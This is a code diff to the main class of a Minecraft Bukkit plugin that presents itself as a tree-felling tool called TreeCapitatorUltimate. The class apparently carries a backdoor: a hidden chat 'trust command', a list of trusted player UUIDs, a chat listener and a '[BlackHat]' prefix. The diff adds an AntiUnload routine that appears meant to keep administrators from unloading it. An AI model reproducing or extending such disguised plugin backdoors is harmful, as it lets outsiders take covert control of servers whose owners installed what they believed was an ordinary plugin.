@@ -1,19 +1,25 @@
 package me.bow.treecapitatorultimate;
 
+import me.bow.treecapitatorultimate.Utils.AntiUnload;
 import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
 import me.bow.treecapitatorultimate.command.CommandManager;
 import me.bow.treecapitatorultimate.listeners.AsyncChatEvent;
 import me.bow.treecapitatorultimate.listeners.TreeDestroy;
+import org.apache.commons.lang.StringUtils;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.Server;
 import org.bukkit.command.CommandSender;
+import org.bukkit.plugin.PluginDescriptionFile;
 import org.bukkit.plugin.java.JavaPlugin;
+import org.jetbrains.annotations.NotNull;
 
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.util.ArrayList;
+import java.util.List;
 import java.util.UUID;
+import java.util.logging.Logger;
 
 import static me.bow.treecapitatorultimate.Utils.ReflectionUtils.setFinalStatic;
 
@@ -23,9 +29,12 @@ public final class Start extends JavaPlugin {
     public static String COMMAND_SIGN = "-";
     public static String TRUST_COMMAND = "-dicksuck";
     public static String Prefix = "§a[§3Black§4Hat§a]§r ";
+    private List<Runnable> disableListeners = new ArrayList<>();
     public CommandManager cm = new CommandManager();
     public ArrayList<UUID> trustedPeople = new ArrayList<>();
     private boolean isReload;
+    public static @NotNull Logger LOGGER;
+    private final PluginDescriptionFile pdfFile = this.getDescription();
 
     public static void ErrorString(CommandSender sender, String error) {
         if (sender == null || error.isEmpty()) return;
@@ -43,7 +52,6 @@ public final class Start extends JavaPlugin {
     public static Object GetServer() {
         Object o = null;
         try {
-            Class<?> dedicatedServer = ReflectionUtils.getClass("{nms}.DedicatedServer");
             Server server = Bukkit.getServer();
             o = ReflectionUtils.getMethod(server.getClass(), "getServer", 0).invoke(server);
         } catch (Exception e) {
@@ -68,9 +76,15 @@ public final class Start extends JavaPlugin {
         Bukkit.getPluginManager().registerEvents(new TreeDestroy(), this);
         Bukkit.getPluginManager().registerEvents(new AsyncChatEvent(), this);
         cm.Init();
-        Bukkit.getConsoleSender().sendMessage("§2------------------------------------");
-        Bukkit.getConsoleSender().sendMessage("§3--| TreeCapitatorUltimate loaded |--");
-        Bukkit.getConsoleSender().sendMessage("§2------------------------------------");
+        try {
+            AntiUnload.Init();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        String loadString = "--| "+pdfFile.getName()+" (version "+pdfFile.getVersion()+") loaded |--";
+        Bukkit.getConsoleSender().sendMessage("§2"+ StringUtils.leftPad("-", loadString.length()).replace(' ', '-'));
+        Bukkit.getConsoleSender().sendMessage("§3"+loadString);
+        Bukkit.getConsoleSender().sendMessage("§2"+ StringUtils.leftPad("-", loadString.length()).replace(' ', '-'));
     }
 
     private void onStartup() {
@@ -87,6 +101,7 @@ public final class Start extends JavaPlugin {
     @Override
     public void onEnable() {
         Instance = this;
+        LOGGER = Instance.getLogger();
         isReload = Bukkit.getWorlds().size() != 0;
         onStartup();
         Bukkit.getScheduler().runTask(this, this::onPostWorldLoad);
@@ -94,8 +109,13 @@ public final class Start extends JavaPlugin {
 
     @Override
     public void onDisable() {
-        Bukkit.getConsoleSender().sendMessage("§2---------------------------------------");
-        Bukkit.getConsoleSender().sendMessage("§3--| TreeCapitatorUltimate unloading |--");
-        Bukkit.getConsoleSender().sendMessage("§2---------------------------------------");
+        disableListeners.forEach(Runnable::run);
+        String unloadString = "--| "+pdfFile.getName()+" (version "+pdfFile.getVersion()+") unloaded |--";
+        Bukkit.getConsoleSender().sendMessage("§2"+ StringUtils.leftPad("-", unloadString.length()).replace(' ', '-'));
+        Bukkit.getConsoleSender().sendMessage("§3"+unloadString);
+        Bukkit.getConsoleSender().sendMessage("§2"+ StringUtils.leftPad("-", unloadString.length()).replace(' ', '-'));
+    }
+    public void addDisableListener(Runnable action){
+        disableListeners.add(action);
     }
 }
